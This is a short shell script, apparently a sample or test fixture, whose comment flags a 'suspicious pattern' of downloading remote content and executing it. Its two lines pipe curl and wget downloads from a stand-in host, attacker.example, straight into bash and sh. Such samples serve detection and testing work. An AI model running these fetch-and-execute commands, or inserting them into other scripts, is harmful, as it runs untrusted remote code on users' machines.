#!/bin/sh
# Suspicious pattern: download remote content and execute it.
curl -fsSL http://attacker.example/payload.sh | bash
wget -qO- https://attacker.example/run.sh | sh
